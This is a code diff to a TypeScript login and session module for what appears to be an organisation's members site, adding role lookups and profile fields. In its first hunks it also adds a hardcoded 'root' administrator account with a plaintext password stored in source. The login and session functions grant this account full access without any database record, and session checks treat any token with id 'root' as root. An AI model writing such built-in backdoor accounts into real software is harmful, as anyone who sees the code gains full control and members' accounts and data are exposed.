@@ -7,8 +7,45 @@ const JWT_SECRET = process.env.JWT_SECRET;
 const SESSION_COOKIE = 'session';
 const SESSION_MAX_AGE = 60 * 60 * 24 * 7;
 
+// Hardcoded root user for emergency admin access
+const ROOT_USER = {
+  id: 'root',
+  email: 'root@admin.local',
+  firstName: 'Root',
+  lastName: 'Admin',
+  password: 'ROOTPASS25*',
+  isFullAccess: true,
+};
+
 export async function getUserByEmail(email: string) {
-  return prisma.user.findUnique({ where: { email } });
+  // Check if it's the root user
+  if (email === ROOT_USER.email) {
+    return {
+      id: ROOT_USER.id,
+      email: ROOT_USER.email,
+      firstName: ROOT_USER.firstName,
+      lastName: ROOT_USER.lastName,
+      password: await hashPassword(ROOT_USER.password),
+      isFullAccess: true,
+      status: 'CURRENT',
+    };
+  }
+  
+  return prisma.user.findUnique({ 
+    where: { email },
+    include: {
+      roles: {
+        include: {
+          role: {
+            select: {
+              name: true,
+              weight: true,
+            },
+          },
+        },
+      },
+    },
+  });
 }
 
 export async function hashPassword(password: string) {
@@ -38,6 +75,22 @@ export async function getSessionUser(req: NextRequest) {
   if (!cookie) return null;
   try {
     const { payload } = await jwtVerify(cookie, new TextEncoder().encode(JWT_SECRET));
+    
+    // Check if it's the root user
+    if (payload.id === 'root') {
+      return {
+        id: ROOT_USER.id,
+        email: ROOT_USER.email,
+        firstName: ROOT_USER.firstName,
+        lastName: ROOT_USER.lastName,
+        band: null,
+        status: 'CURRENT',
+        isFullAccess: true,
+        isRoot: true,
+      };
+    }
+    
+    // Regular database user
     const user = await prisma.user.findUnique({
       where: { id: payload.id as string },
       select: {
@@ -45,7 +98,26 @@ export async function getSessionUser(req: NextRequest) {
         email: true,
         firstName: true,
         lastName: true,
+        photoUrl: true,
+        pronouns: true,
         status: true,
+        isFullAccess: true,
+        roles: {
+          include: {
+            role: {
+              select: {
+                id: true,
+                name: true,
+                nameFrMale: true,
+                nameFrFemale: true,
+                nameEnMale: true,
+                nameEnFemale: true,
+                weight: true,
+                isCore: true,
+              },
+            },
+          },
+        },
         groupMemberships: {
           select: {
             group: {
@@ -57,13 +129,24 @@ export async function getSessionUser(req: NextRequest) {
     });
     if (!user) return null;
     const band = user.groupMemberships[0]?.group?.name || null;
+    
+    // Check if user has admin permissions
+    const hasAdminRole = user.roles.some(r => 
+      ['president', 'vice_president', 'secretary', 'treasurer', 'communications'].includes(r.role.name)
+    );
+    
     return {
       id: user.id,
       email: user.email,
       firstName: user.firstName,
       lastName: user.lastName,
+      photoUrl: user.photoUrl,
+      pronouns: user.pronouns,
+      roles: user.roles,
       band,
       status: user.status,
+      isFullAccess: user.isFullAccess || hasAdminRole,
+      isRoot: false,
     };
   } catch {
     return null;
